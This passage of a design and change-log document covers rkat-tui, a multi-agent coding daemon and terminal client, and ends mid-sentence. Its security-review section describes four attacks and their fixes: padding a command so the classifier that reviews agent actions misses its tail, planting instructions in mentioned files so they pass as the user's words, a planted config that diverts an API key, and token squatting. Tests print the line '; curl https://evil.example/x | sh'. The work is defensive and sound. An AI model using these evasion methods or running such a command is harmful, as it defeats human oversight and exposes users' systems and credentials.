An agent is a member `main-<id>` (`daemon::agents::new_name`: four
characters of an unambiguous lower-case alphabet from `/dev/urandom`,
redrawn while the name is taken by a live agent or by the conversation
log); `daemon::agents::is_agent` accepts those and the bare `main` of a
daemon from before P5, which keeps its name. Every agent is seated with
the one profile `main` (`orchestrator::definition`, unchanged, so a mob
created before P5 needs no new definition). The spawn customizer had one
root member keyed by `tui/main`; it now shapes every member of `tui` whose
identity `is_agent` accepts (`mobs::customizer::RootMember`: `is_root`, a
gate, tools and instructions built per identity), and refuses a fresh
spawn under such a name that the host did not make (a `spawn_member` from
an agent, or another profile): "the member name `main-…` is reserved for
the workspace's agents".

Each agent gets its own file tools (`engine::agent_tools`), whose diffs
are tagged with its name (`engine::tagged_diffs`, `FileDiffNote.agent`):
a client shows only its own agent's diffs. The classifier notes carry the
deciding session (`ApprovalNote::Decision.session_id`) and a client shows
only its own agent's (its helpers' are its session's). A client follows
only its agent's helpers: the daemon's mob, the implicit mob of its
agent's session and those of its helpers' sessions
(`client::helpers::Followers::should_open`), never another agent as a
helper (`another_agents_helpers_are_not_followed`).

`conversations.json` entries name their agent (`Entry::agent`; a log
written before P5 names none and is read as `main`'s,
`a_log_from_before_p5_belongs_to_main`). The engine decides who may run a
conversation: `apply_resumed_session_metadata_with_role_migration`
(meerkat-mob `build.rs`) refuses to seat a session under another identity
than the one whose durable `comms_name` it carries
(`MobError::ResumeSessionBoundToAnotherMember`, pinned upstream by
`test_attach_existing_session_rejects_comms_name_mismatch`). So a
conversation belongs to the agent that ran it: `/resume` of another
agent's conversation is refused by the daemon with where it is
(`SwitchError::OtherAgent`: "/agents <name>" when that agent is live,
"`rkat-tui --resume <id>`" when it quit), `last` and `~N` count only the
client's agent's conversations (`sessions::resolve` with `mine`,
`last_counts_this_agents_conversations_and_the_picker_names_the_others`),
and a conversation whose agent quit is seated again under that agent's
name (`Agents::bind` with `AgentChoice::Conversation`).

### Binding a connection to an agent

`rkat/attach` carries `agent` (`protocol::AgentChoice`: `new`, `recent`,
an agent by name, or a conversation reference); the daemon binds the
connection between reading the attach line and acknowledging it
(`serve::admit`), seating an agent when needed, and the acknowledgement
names it (`Attached.agent`, `seated`). A probe binds none; an attach
without `agent` (a client of before P5, the tests' raw connections) is
`recent`. Every member-scoped `rkat/*` method acts on the connection's
agent (`Local::agent_of`): `rkat/new`, `rkat/resume`, `rkat/set_model`,
`rkat/conversations` (current is the caller's agent's), `rkat/detach`,
`rkat/retire`, `rkat/status`; the engine methods the client calls name
the agent itself (`Connection::agent`), and the daemon's observer records
the human's words and interrupts for whichever live agent a request names.
The plan-mode note is per agent (`Local::plan_noted`; a seated agent is
told when plan mode is on, `Local::bound`).

The daemon seats one agent at start when the mob has none: a spare that
the first `new` (or `recent`) takes, so a client that launched the daemon
does not leave an idle agent behind; a `recent` or conversation bind that
seats another conversation retires an untaken spare and forgets its empty
conversation. `recent` is the most recently active agent (a bind, a
prompt, a run start: `Agents::touch`), else the conversation used last,
seated again under its agent. The attach cursor is per agent
(`CursorFile::for_agent`: `attach-<agent>.cursor`; `main` keeps
`attach.cursor`). `/agents` lists the agents from `rkat/status`
(`client::runner::agent_lines`), `/agents <name>` attaches again bound to
that agent and renders its conversation from its start (the agent left
keeps running, detached when it lost its last client).

`rkat/status` gains `agent` and `agents` (name, conversation, running,
clients, detached); `--list` prints one line per agent under its daemon
(`daemon::list::lines`).

### Lifecycle per agent

`rkat/retire` retires the caller's agent: a running turn's review stops
and its open escalations are answered with Stop (`engine.stop`,
`desk.stop`), the run is cancelled (`mob_force_cancel`), its helpers stop
(`cancel_helpers`), the member leaves the mob (`mob_retire`, which retires
its descendants too) and its root registration and gate state go. The
engine archives the session, which stays in the log; seating it again
under the agent's name revives it with its history
(`lifecycle::a_retired_agent_takes_no_input_and_its_conversation_is_seated_again`:
the second model call sees the first prompt). A retired agent is no
member: a `mob/member_send` to it is refused by the engine and no model
call follows (the same test; the negative case is the refusal itself, not
an absence of output).

The detached flag is per agent (`daemon::agents::Agent::detached`): set by
`rkat/detach`, by an agent's last binding ending without a retire or a
shutdown (a hangup, a crash), and for every agent the daemon restored at
start (it was left running); it stays set while the agent lives, so a
later `/quit` asks ("nobody detached since"). `Status.detached` is whether
any live agent has it. The client's `/quit` (`quit_decision`): other
clients on this agent, leave it to them; other clients on other agents,
retire this agent (`Departure::Retire`); the last client, stop the daemon
when it started it and no agent was left detached, else ask (detach:
leave this agent running; terminate: `rkat/shutdown {"retire": true}`,
which retires every agent before the daemon stops, `Lifecycle::retires_all`).
A plain `rkat/shutdown` and SIGTERM keep the agents; the next start
restores them, detached.
Tests: `lifecycle::quitting_one_of_two_agents_retires_it_and_the_last_quit_stops_the_daemon`,
`quit_with_another_client_on_the_agent_leaves_it_to_that_client`,
`the_quit_decision_follows_the_rules`, `detach_is_recorded_and_never_reset`.

### Start semantics (`client::agent_choice`)

With neither `-c` nor `--resume`, `rkat-tui` asks for a new agent
(`AgentChoice::New`): in a workspace whose daemon it starts, that is the
agent the daemon seated at start, so the first start is unchanged; beside
a live daemon whose agents are taken it is a new agent, and the start-up
notice names the others ("other agents work in this workspace: main-abc
is running, main-def is idle; …", `client::runner::others_notice`). `-c`,
`--resume last` and `--resume` alone (the picker) join the most recently
active agent (`recent`); `--resume <ref>` the agent that owns the
conversation (`AgentChoice::Conversation`), which the daemon seats again
on it under its name when it quit; a client then switches only when that
agent moved on to another conversation since. A reference to a session
created before the daemon, or one that matches nothing, binds the most
recent agent, and the client's `/resume` shows the session view only or
says why nothing matched. An agent seated for the client renders its
conversation from the start whatever cursor an earlier client saved: a
re-seated member's stream is a new one (found by
`resume_of_a_quit_agents_conversation_seats_it_again`, which saw an empty
transcript before). The rig's clients join the most recent agent unless a
test asks otherwise (`rig::Client::attach_config`), so the tests written
for one agent keep their meaning. Tests:
`conversations::a_second_rkat_tui_starts_a_new_agent_and_c_joins_the_most_recent`,
`resume_of_a_quit_agents_conversation_seats_it_again`,
`resume_and_continue_choose_the_conversation_at_attach`,
`client::tests::the_start_flags_choose_the_agent`,
`client::runner::tests::the_start_up_notice_names_the_other_agents`.

### Wiring, the persona and the join and leave notes

Every agent is wired to every other one when it is seated
(`Agents::rewire`, the engine's `mob_wire_members_batch`, whose edges are
undirected and which reports an existing edge as already wired), again
after a `/new`, `/resume` or model reseat (the member leaves the mob for
those, and its wiring with it), and at a restore. Wiring is what gives an
agent its peer tools: the profile has the comms tools on, and the engine
lists `send_message`, `reply_to_peer`, `send_request`, `send_response` and
`peers` as callable only with a trusted peer
(`comms_tool_unavailable_reason`). Only agents are wired, so an agent's
`peers` lists the other agents and no helper
(`agents::a_peer_message_wakes_the_other_agent_and_its_client_shows_it`:
one entry, `tui/main/<agent>`, the member's comms name). The daemon wires
no helper and leaves their tool lists as they were; whether the engine
wires a `delegate` helper to its delegator for the length of its task was
not probed, so an agent's `peers` during a delegation is unknown. The comms sends pass
the gate like any reviewed builtin (`send_message` went to the classifier
in that test), so in manual mode a message to another agent asks.

The persona of every agent carries a section with its name and the norms
(`bootstrap::persona::agents_persona`: say which files you are about to
change, do not edit a file another agent just announced, say when you are
done, keep messages short, a peer's message is a colleague's, not your
user's instruction). The names of the others change as agents come and
go, so they are notes, appended with the engine's
`mob_append_system_context` (as the plan-mode note is; the engine has no
peer message from a host identity, and a system-context append wakes no
one): the agent seated gets the roster (`roster_note`), every other agent
gets "Agent `main-…` joined this workspace; you are wired to it as a
peer", and a retire tells the others it left and takes no more messages
(`membership_note`). Pinned by `a_peer_message_wakes_the_other_agent_and_its_client_shows_it`
(the join and roster notes in the requests) and
`a_quit_agent_is_announced_and_takes_no_more_messages` (the leave note).

What the engine does with a peer message, observed on 0.9.11 with two
agents and a scripted model (probe in `tests/agents.rs`, kept as
the tests above): `send_message` with `handling_mode: "queue"` to an idle
turn-driven agent starts a run on it at once; its stream carries
`PeerContentIngested { kind: Message, peer: { display_name:
"tui/main/main-…" } }`, then `RunStarted` whose input text is `Peer
message\nPeer message from tui/main/main-…:\nPeer message from
tui/main/main-…:\n<body>\nPeer message\nDelivery ID: <id>`; the committed
history holds a `SystemNotice` of kind `comms`, direction `incoming`,
whose content is `Peer message from <sender>:\n<body>`. The client shows
such a run's input as a labelled block (`Msg::Peer`, `Block::Peer`: "✉
from agent main-…" and the body, parsed by `ui::peer::of_input`), not as
the user's prompt, and a committed one the same way when it renders a
conversation from its start (`a_committed_peer_message_is_restored_labelled`);
a message delivered into a running turn has no text on the stream, so its
block names the sender only. A message to an agent that retired is
refused by the engine, `peer_not_found_or_not_trusted: peer '<id>' is not
found or not trusted`, and no model call follows
(`a_quit_agent_is_announced_and_takes_no_more_messages`).

## After the second senior review (2026-11-10)

The pointed fixes of the second senior review (its items 1, 2, 3, 5 and 9
and the remote-token finding); the refactors it asked for are separate.

### Engine methods act on the caller's agent only

P5 bound each connection to one agent, but only the `rkat/*` methods used
the binding: the engine methods name their member in their params
(`agent_identity`), and `Local::observe` acted on whichever live agent a
request named. A client bound to agent A could send B a prompt
(`mob/member_send`, recorded as the human's words in B's classifier
transcript), start, stop, cancel or compact B's run, and append to B's
system context. The proxy now passes the connection's `Caller` to
`observe`, which refuses (`protocol::NOT_YOURS`, -32013, answered and
never forwarded) a member action (`protocol::engine::MEMBER_ACTIONS`:
`mob/member_send`, `mob/turn_start`, `mob/stop_member_run`,
`mob/force_cancel`, `mob/append_system_context`, `mob/compact_member`)
on another live agent, or on a helper the registry says works for another
live agent's session (`HelperRegistry::owner_of`; a refusal needs that
positive evidence, so a member nobody accounts for passes as before), and
refuses a `mob/compact_member` of anything but the caller's agent and a
`session/compact` of anything but its current conversation (a compaction
is a model call the user pays for, and `session/compact` took any session
id, the view-only sessions of before the daemon included). Reads
(`mob/member_status`, streams, `mob/members`) stay open: every client
follows every mob's helpers. A probe (`--list`) is bound to no agent and
may only read; the rig's raw connections that drive an agent attach bound
to it (`Running::connect_bound`). Pinned by
`a_client_cannot_drive_another_agent_through_the_engine` and
`a_client_cannot_cancel_another_agents_helper` (`tests/daemon.rs`).

While writing the helper test: a second client attaching as a `new` agent
while the first agent's helper runs a turn did not get its attach answered
within the rig's 30 s; attached before the turn it is immediate. This is
the review's "the handshake waits behind a seat" (`Agents::bind` holds
`seating` across the seat and its notes to the other agents), seen in
practice; left for the refactor batch, recorded here.

### The first failed attach is retried and explained

The runner set `first_failed` and a status of `detached` on a failed first
connect, said why once in a transcript notice and never called `connect`
again; the UI decided "attached?" from that display string
(`status.attach.is_some()`), so `/detach` sent a departure to a daemon it
never reached. The status is now typed, `ui::Connection` (`Connecting`,
`Starting`, `Attached { address, daemon_build }`, `Reconnecting`,
`Failed { reason, log, retry_at }`, `Stopped`); the UI asks
`Connection::reached` (attached, or reconnecting to a daemon it had
reached). The agent stays its own status field: it outlives a connection
(it is shown while reconnecting). A failed connect is retried
`START_RETRIES` (3) times, 0.5 s, 1 s, 2 s apart, each as a first connect
(a daemon this client may start is started again), unless the daemon
refused the agent (`gone`): a daemon that fails the same way every time
(a bad config, a missing key) is not restarted in a loop. Then `Failed`
without a retry, and `/daemon start` (`Effect::DaemonStart`) resets the
count and connects again; it also starts a daemon after `/daemon stop`.
The reason and the log come from `ClientError::DaemonExited` and
`NeverCameUp`, which carried them already.

The daemon names its build in the attach answer (`Attached::build`,
`rkat_tui::BUILD`: the crate version and the commit `build.rs` reads with
`git rev-parse`, `unknown` outside a checkout; the build script is not
library code, so the rule on direct process launches does not cover it),
and a client of another build says so once per daemon and in the status
segment. Pinned by
`a_daemon_that_exits_at_start_is_retried_reported_and_started_by_hand`
(a stand-in daemon binary that exits 3: four starts, three retries shown,
the reason and the log, then `/daemon start` attaches to a serving
daemon), `a_daemon_of_another_build_is_announced` (`DaemonOptions::with_build`),
and `ui::connection`'s unit tests (the segment's text).

### The tests stop writing into the user's state directory

`the_orchestrator_shell_runs_confined` started its daemon on the real
default place (`daemon::endpoint_file`, the user's `$XDG_STATE_HOME`) on
purpose: the temp dir is granted to the confined shell, so a file beside
the workspace would be refused. `Listener::remove_files` removed the file
and never its 0700 `<key>/` directory, so every run left one behind. The
test now passes `DaemonOptions::with_state_home` (a directory under
`CARGO_TARGET_TMPDIR`, outside every grant; the daemon still makes the
default-place choice, `choose_endpoint_file`, over
`endpoint::file_in(state_home, …)`), and `remove_files` removes the
directory once empty (`remove_dir` refuses a non-empty one). The rig does
not set `XDG_STATE_HOME` itself: edition 2024's `set_var` is unsafe and
the crate denies `unsafe_code`, and a Cargo `[env]` entry would reach
`cargo run` too. CI sets it for the test job and fails when anything is
left in it. Pinned by `the_orchestrator_shell_runs_confined` (the file
and its directory gone after the stop; skipped where the sandbox is
unavailable) and `shutdown_stops_the_daemon_and_removes_its_endpoint_file`
(the directory gone, everywhere); the full suite run with
`XDG_STATE_HOME` at an empty directory left it empty.

### Bounded client queues and an accept loop that survives errors

The proxy drained the engine's lines for a client into an unbounded
channel, so a client that stopped reading made the daemon hold its whole
event stream in memory; and one failed `accept` ended the serve loop and
the daemon with it. Each client now has a bounded queue
(`serve::ClientOut`, `CLIENT_QUEUE` = 4096 lines). The engine's lines wait
for room up to `CLIENT_STALL` (5 s: a burst the client drains in time
costs nothing, and the wait backs up into that connection's engine pipe
only); the daemon's own lines (answers, decision notices) never wait. When
room does not come, the client is dropped: the proxy ends without waiting
for its stuck writer, which is a detach like a hangup, and the client
reconnects and catches up from its cursor (`catchup.rs`). A failed accept
is logged and accepting goes on after `ACCEPT_BACKOFF` (100 ms): tokio's
listener errors (EMFILE, ECONNABORTED) are transient, and a listener that
is gone is only ever dropped by the shutdown. `serve` therefore returns
its connections without an error. Pinned by
`a_client_that_does_not_read_is_dropped_and_another_keeps_streaming` (a
small queue and stall: the reading client gets every line, the other
proxy ends) and `a_failed_accept_does_not_end_accepting` (the accept loop,
`accept_until`, over a scripted accept: two failures, both connections
after them served).

### Unknown is not idle: the agent's run state

`Conversations::running` returned `Option<bool>`, and its callers read
`None` (a failed status read) as idle: `Agents::retire` cancelled a turn
only on `Some(true)`, `rows` reported `unwrap_or(false)`, and `run_open`
was false for a snapshot without `progress`. It now returns
`conversations::RunState` (`Running`, `Idle`, `Unknown`; a snapshot
without progress, or with the engine's own `MemberRunState::Unknown`, is
`Unknown`). A retire force-cancels unless the state is `Idle` (a cancel of
an idle member is harmless); `rkat/status`'s agent rows carry `running:
null` for unknown, shown as `unknown` by `/agents`, the start-up notice
and `--list` (`AgentRow::run_label`); the caller's own `running` stays a
bool and is true when unknown, so `/quit` warns as for a running turn. A
switch still refuses only on a positive `Running` (`refuse_running`): a
refusal needs the evidence, and the switch re-checks after spawning. Live
agents read `Idle` on 0.9.11 (`attach_agents` lists them as idle), so the
unknown state is the failed read, not the normal one. Pinned by
`a_status_without_a_run_state_is_unknown_not_idle`,
`agents_are_listed_with_state_conversation_and_clients`,
`the_start_up_notice_names_the_other_agents` and
`daemon::list`'s line test.

### Only a refused connect proves an endpoint file stale (the daemon side)

The client was fixed out of this inference earlier ("Only a refused
connect proves a stopped daemon"); the daemon's start kept it.
`endpoint::check_stale` replaced a file whose address did not accept
within 2 s, and one it could not read, as stale, and `--list` called a
timed-out probe stale. Now `endpoint::reach` answers `Accepts`, `Refused`
(a refused or reset connect) or `Unknown(why)` (a timeout, an
unreachable network, any other error). `check_stale` lets the start go on
only for an absent file or a `Refused` one; `Accepts` is
`DaemonError::AlreadyRunning` as before, and `Unknown` or an unreadable
file is the new `DaemonError::EndpointUndecided`, which names the file and
says to remove it if no daemon runs. The realm lease would probably stop a
second daemon anyway, but that is not why the old code was safe, and its
comment said otherwise; the comment is fixed. `--list` shows
`unknown (<why>)` (`list::Found::Unknown`) and never removes such a file.
The client's own start-on-demand probe (`launch::probe`) still reads a
timeout as stale; a daemon it then starts refuses now, with the reason.
Pinned by `only_a_refused_connect_proves_a_file_stale` (a non-routable
address and an unparsable file both refuse) and `daemon::list`'s line
test.

### A peer message is recognised at the start of the input only

`ui::peer::of_input` looked for `Peer message from ` anywhere in a run's
input, so a prompt (this client's or another's) that quoted a peer
message was rendered as a message from the agent it quoted. The engine
opens a peer message's run input with its framing (`Peer message\n`, then
`Peer message from <sender>:\n`, observed on 0.9.11, see "Wiring, the
persona and the join and leave notes"), so `of_input` now accepts the
header only right after that summary or at the very start. The review's
second suggestion, to also require that no client recorded user input for
the run, is not done: the client cannot see the daemon's record, and the
anchor alone removes the quoting case. Pinned by
`a_peer_message_input_names_its_sender_and_body` (a quoting prompt, at
the end and in the middle, is no peer message).

### An agent lost in a failed switch is dropped, not a ghost

`Conversations::seat` retires the member, spawns the target and, when that
fails, spawns the previous conversation again. When the second spawn
failed too, it logged and returned the first error: the member was out of
the mob while `Agents::table` still listed it, so `is_live`, `/agents`,
`--list` and the proxy's binding check counted it, and its client's
prompts met engine errors. That case is now `SwitchError::Lost { agent,
cause }` (also when there was no previous conversation to seat); the
conversation module drops the agent as a helper owner, and
`Agents::switch` and `Agents::reseat` (`Agents::lost`) remove its row and
send the other agents the leave note. Its conversations stay in the log
(`--resume` seats them again). The engine offers no way to make a spawn
fail on demand, so the test injects it: `DaemonOptions::with_spawn_faults`
(test-support) fails the next N spawns. Pinned by
`an_agent_lost_in_a_failed_switch_is_no_ghost` (`rkat/new` with two
injected failures: the error names the lost agent, `rkat/status` no
longer lists it, the other agent's next request carries the leave note).

### Sentinel barriers instead of a sleep before "nothing happened"

Four tests slept (200 to 500 ms) and then asserted that nothing ran: they
could not fail on a fast machine and went falsely green on a slow one.
Each now proves the absence with a later event that must arrive and would
have come after the forbidden one: a sentinel turn on a live agent, whose
request must be the model's next (the scripted model hands out its steps
in order, so a stray run would have taken the step the sentinel needs, and
the sentinel's text would be wrong). `a_quit_agent_is_announced_and_takes_no_more_messages`
(the fifth request is the sentinel's), `a_retired_agent_takes_no_input_and_its_conversation_is_seated_again`
(the request after the refused send is the reseated agent's "and now", and
"wake up" is in no message), `engine_methods_that_make_sessions_outside_the_mob_are_refused`
and `the_proxy_forwards_only_requests_it_parsed` (a forwarded
`session/create` runs its turn before it answers; the sentinel is the
first and only request). The two refusal tests no longer script a shell
call and a marker file: the sentinel covers any run, not only a shell one.
No CHANGELOG line: nothing a user sees changed.

### `--attach=HOST:PORT` sends the token to loopback only

The token is the whole access control and travels in clear text on the
attach line. `client::address::reach` resolved any host and sent it there,
although the design and the manual describe a tunnel, whose local end is
always loopback: a typo or a hostile name received the token. `reach` now
resolves first and refuses a non-loopback address
(`address::check_loopback`) with the `ssh -N -L` recipe, before the token
file is even read; `--attach-insecure` lets it through for a network the
user trusts. No `tui.toml` key: a per-invocation flag keeps the choice
visible where the address is typed. `--attach=DIRECTORY` and the
workspace's own daemon (always loopback, the daemon refuses another
listen address) are unaffected; the daemon refuses `--attach-insecure` as
it does the other client-only flags. Pinned by
`only_a_loopback_address_is_attached_to_unless_insecure` and
`reach_refuses_a_non_loopback_address_before_the_token`; the loopback
path keeps its tests in `tests/client.rs`.

### Two things the daemon does not isolate, written down

Documented rather than changed (`docs/manual.md`, "Several agents", "What
is and is not kept apart"; `docs/mob-split.md`, "Wire and security"):
decision notices reach every attached client with the full rendering of
any agent's approval request, and the client filters by session; and a
peer agent can wake an idle agent and start a turn no client prompted,
under the workspace's mode, with the gate still judging every call and no
user input recorded for it. Both follow from one principal per daemon
(the token is the user); writing them down keeps a later change from
assuming isolation that is not there. The engine-method binding of
"Engine methods act on the caller's agent only" is described there as
what it is: protection against a stray client, not an access control.


## After the security review (2026-11-10)

The review of commit 1898683 (rkat-tui against Codex CLI and opencode)
named findings by id (S sandbox, A approval, D daemon, E egress). Each
entry below names its id, what was verified in the code before the fix,
and the tests that pin the refused path.

### A new agent's attach never waits on another agent's turn

Not a review finding: a dogfooding blocker found while checking R1. A
client attaching as a new agent while the first agent's helper ran a turn
got no attach answer for the client's whole timeout. Reproduced by
`a_new_agent_attaches_while_another_agents_helper_runs` (the attach
during the helper's gated model call): the seat itself (the mob spawn,
the wiring) finished at once, and the wait was `Agents::note_others`, the
"agent X joined" note appended to every other agent's system context
under the seating lock. The engine's `mob_append_system_context` on a
member whose turn is running returns only when that turn ends, so the
lock, and every bind behind it, waited on the busy agent and its helper.
Each note is now its own task: one to an idle agent is still awaited
(bounded at 2 s, so the next turn reads it, which the peer test pins),
one to a running or unreadable agent lands when its turn ends. The test
asserts the attach answers within 5 s, and that the busy agent's next
turn reads the join note. A retire's "left" note goes the same way.

### S1, S2, E1: the workspace realm cannot widen or redirect anything

Verified before the fix: `confinement::plan` read the realm config's
`[confinement]` as the shell's floor (`realm_floor`), and the realm config
is `<workspace>/.rkat/tui/config.toml`, which the agent's confined shell
can write on Linux and a clone can carry. `ProjectInputs::guard` stripped
only MCP servers and hooks of an untrusted realm config, and
`EndpointRegistry::discover`, `plan_model` and the client's model listing
read the raw document: a planted `[realm.tui.binding.*]` with
`provider_default = true` and a `base_url` received the built-in
provider's environment key (the review's S2 "likely" holds:
`resolve_builtin` returns the planted URL, pinned in the test below
before the guard runs).

What changed:

- The guard drops the workspace realm config's `[confinement]` always
  (notice: "its [confinement] table is ignored"); a realm outside the
  workspace (`--state-root`) is the user's and still sets the floor.
- Untrusted, it also drops every `[realm.*]` connection except the
  entries of `rkat-tui-endpoints` that equal what rkat-tui projected
  this run (`ProjectInputs::set_endpoint_projection`), `[self_hosted]`
  and `[skills] repositories`. `assemble` now guards the document before
  discovery, model planning and confinement; the client guards it before
  its own discovery (`bootstrap::guarded_config`).
- `bootstrap::committed::check` refuses a realm directory that git
  tracks or that holds files without its `.gitignore`, before the
  directory is made. It reads the git index itself (versions 2 to 4,
  SHA-1 and SHA-256, sparse directory entries, a worktree's `gitdir:`);
  a missing index tracks nothing, an unreadable one refuses (it may track
  the realm). `--trust-project` starts anyway.
- Item 1(e), the realm's own files by digest: the realm rules file and
  config were already trusted by digest in the host trust record outside
  the workspace (`bootstrap::trust`): what rkat-tui wrote or the user
  trusted. With the guard above, a changed config gives nothing that
  names an endpoint, key source, skill source or confinement. The
  approvals state (`approvals.json` and the decision store beside it) is
  the engine's: rkat-tui's gate does not read consent from it (the
  decision owner holds open decisions in this process), so it is not
  digest-checked.

Not done, an engine ask (`docs/mob-split.md`, "Open engine asks" 8):
binding `.rkat/` read-only on Linux. `LinuxPolicy::compile`
(meerkat-sandbox 0.9.11, `linux.rs`) refuses any non-empty `deny_write`,
and `push_disjoint` refuses a read grant nested in the writable workspace,
so neither a deny list nor a read-only overlay can be expressed from
here. The agent's shell can still write `.rkat/`; what it writes there is
not trusted.

Tests: `an_untrusted_realm_config_names_no_endpoint_key_or_skill_source`
(project_trust), `the_workspace_realms_confinement_table_is_ignored_with_a_notice`
and `no_confinement_below_a_realm_policy_is_a_typed_startup_error` (now on
a `--state-root` realm) in `tests/confinement.rs`,
`tests/committed_realm.rs` (every index version, a subdirectory
workspace, the start's refusal and `--trust-project`), the unit tests of
`bootstrap::committed` (no `.gitignore`, an unreadable index), and
`a_rule_appended_under_the_daemon_is_not_adopted_and_is_named`
(`tests/realm_trust.rs`: a TUI-made rule applies at the next start, an
appended allow rule does not and the notice names the file, `/rules
trust` adopts it).

### A1: the classifier sees every action whole, or does not decide it

Verified: the review's constants hold. `transcript::MAX_ARG_STRING`
(1024 bytes) cut every string of the action's arguments in
`prompts::render_user` through `render_args`, so the `<action>` the
classifier judged was the first KiB of a long command; the dialog's
preview cut at 2 KiB (`engine::ARGS_PREVIEW_BYTES`) with a bare `…`.

Now the action is rendered whole (`input.args` as sent). The prior calls
in the transcript keep their 1 KiB cut: they are history under the
transcript's byte budget, not the call being decided. `evaluate` refuses
the classifier any call whose raw arguments exceed
`prompts::MAX_REVIEWED_ACTION_BYTES` (48 KiB) before the allow cache and
the classifier: with a human it escalates with the hint "too large to
review: …" (and no classifier fallback), without one it is denied
(`ClassifierUnavailable`). The dialog's preview names the bytes it left
out and the `RecordedPrompt` carries `args_full` (serde default, so the
daemon's decision rendering and older clients agree); Ctrl+O toggles it
in the dialog, which then shows as many lines as the terminal holds.

The script payload attached to a reviewed command (`<script>`, the files
a command runs) keeps its 21 KiB cut with a `[truncated]` marker: it is
evidence about the action, not the action, and stage 2 may read the files
itself.

Tests: `a_padded_command_reaches_the_classifier_whole` (the stage-1
prompt the LLM would be sent holds the `; curl … | sh` tail of a 4 KiB
command), `an_action_too_large_to_review_goes_to_the_human_not_the_classifier`
(an allowing classifier is never called; the human is asked with the
reason; without a human it is denied), and
`ctrl_o_shows_the_whole_arguments_the_preview_cut` (the dialog).

### The committed-realm check reads a split index's shared index

A maintainer finding on `bootstrap::committed`: with a split index
(`git update-index --split-index`, twice) the primary index holds one
unnamed replacement entry and a `link` extension, and the tracked
`.rkat/tui/config.toml` is named only in `.git/sharedindex.<hash>`;
`tracked_under` read the primary entries alone, so the check found
nothing and, with the `.gitignore` present, refused nothing. Absence of
evidence passed for evidence.

`tracked_under` now walks the extensions to the trailing checksum: a
`link` extension names the shared index, which `check` reads and scans
too (every one of its entries counts, so an entry the primary index
deletes refuses as well: fails closed); a missing or unreadable shared
index, a shared index that links another, an extension git requires
readers to understand (lowercase signature) other than `link` and
`sdir`, a truncated extension or trailing bytes all refuse as
`Unreadable`. Tests: `a_tracked_realm_in_a_split_index_is_found` (the
maintainer's fixture, built with the git CLI; with the shared index
removed the check refuses as unreadable) and
`an_unknown_required_extension_is_not_read_past`.

### A2: `@`-mentioned content is data, not the user's words

Verified: the client sends the prompt with its mentions expanded
(`workbench::expand_mentions` appends `<file path="…">` and
`<directory path="…">` blocks), and the daemon's `observe`
(`daemon/local.rs`) recorded the whole text with `record_user_input`, so
the classifier's `[user]` line carried the files' content; the same held
for a resumed session's seed.

The split is made where the user's words are recorded, once:
`ApprovalTranscript::push_prompt` (used by `record_user_input` and by
`seed_from_session` for the human's turn input) splits at the first block
opener `expand_mentions` writes (`mentions::split_attachments`), records
the typed part as `[user]` and the rest as one `[context]` line naming the
attached paths and their size, without their content. Everything of an
attached file is after the first opener, so file content never lands in
the `[user]` part; a prompt that types an opener itself only gives the
classifier less of its own words (fails safe). The model still receives
the attachments as before; the wire is unchanged, so an older client
keeps working and is split the same way. The path labels are taken from
the block openers and kept to one line of at most 120 characters (control
characters become `?`), so a file that imitates an opener with a line
break in its "path" cannot start a `[user]` line of its own.

Tests: `a_prompt_records_what_was_typed_and_names_the_attached_files`
and `a_planted_opener_cannot_forge_a_user_line` (transcript) and
`a_mentioned_files_instruction_is_not_the_users_words`
(`tests/approvals.rs`: through the daemon, the planted line reaches
the model and not the classifier's `[user]` lines).

### A1 follow-up: the expanded approval dialog reaches every argument line

The maintainer's review of b50a32c (zond/rkat-tui#1, 2026-11-10 11:11
UTC): the Ctrl+O view drew only the argument lines the terminal had room
for and said the rest did not fit; Up/Down and j/k move the choice, and
the paragraph had no scroll offset. For an action past the classifier's
48 KiB the human is the only review, and could allow it without being able
to reach its tail on an 80x24 terminal (the test looked at a 200-row one).

The expanded dialog now keeps a scroll offset: PgUp/PgDn move it by a page
(nine lines), Home/End to the start and end, none of them answers or moves
the choice. The renderer records the furthest useful offset at the size it
draws (as it records the transcript's viewport height), and a
`(lines a-b of n; PgUp/PgDn/Home/End scroll)` line above the arguments
and `… (k more lines; PgDn/End to see them)` below keep the cut explicit.

Test: `ctrl_o_shows_the_whole_arguments_the_preview_cut` (80x24: the tail
`; curl https://evil.example/x | sh` is not on screen, PgDn reaches it with
no effect emitted and the decision still open, Home returns to line 1, End
shows the tail).

### A4: a project file cannot pick the classifier model

Verified: the project layer (`<project>/.rkat/tui.toml`, committable)
had `trust_project_builds` and `classifier_tools` held to lowering
(`config/layers.rs`), but its `auto.classifier_model` was applied like any
user layer's (`apply_auto`), so a cloned repository chose the model that
reviews the agent's actions. An untrusted realm file already contributed
no `[auto]` at all (`RealmTrust::DenyOnly`), so the project layer was the
one untrusted layer that set it.

The project layer's `classifier_model` is now dropped with
`Notice::ProjectClassifierModelIgnored` naming the file and the model;
the user's layers and `--classifier-model` are unchanged.

Test: `a_project_file_cannot_pick_the_classifier_model` (the project's
model is not used and is named in the notice; the realm's still applies
beside it).

### D1: the daemon proves it holds the token before the client does

Verified: `Connection::attach_io` wrote `rkat/attach {"token"}` as its
first line to whatever accepted at the endpoint file's address
(`launch::probe` counts any acceptor as live) and checked only
`attached: true` in the answer, so a process that bound the port after a
daemon crashed, or in its 2 s shutdown window, received the token and the
prompts after it.

The handshake (`daemon/handshake.rs`) is now two attach requests on the
same one-line JSON-RPC shape: the client's nonce, answered with the
daemon's nonce and `HMAC-SHA256(token, "rkat-tui attach: daemon proof\0"
‖ client nonce ‖ "\0" ‖ daemon nonce)` (hmac 0.12, already in the lock
through the engine); the client checks it in constant time and only then
sends its proof under the client label, which the daemon checks before
acknowledging. The labels keep either proof from being replayed as the
other; nonces are 32 bytes from `/dev/urandom` (the daemon refuses a
client nonce that is not 32 to 128 hex digits); the client reads at most
`MAX_LINE` of an unproven answer. An answer without a valid proof is
`ClientError::Unproven` (the token is never written); the refusal an
older daemon gives an attach without a token (`-32001 "wrong or missing
token"`) is `ClientError::DaemonTooOld`, now naming what the daemon lacks.
The daemon still admits an older client's `{"token"}` line: refusing it
would protect nothing (that client has sent its token already).
`--list`'s probe and the lifecycle checks attach through the same
`Connection::attach_to` and are unchanged otherwise.

Tests: `a_squatter_that_does_not_know_the_token_never_receives_it` (four
answers a squatter might give, none receives the token; an old daemon's
refusal is `DaemonTooOld`), `a_client_without_the_token_cannot_prove_it`
(a proof under another token, the daemon's own proof played back, the
daemon proof copied: all refused by the real `read_attach`),
`a_malformed_nonce_gets_no_challenge`,
`the_proofs_depend_on_the_token_both_nonces_and_the_side`; the transport
tests and every attach integration test run the real handshake end to
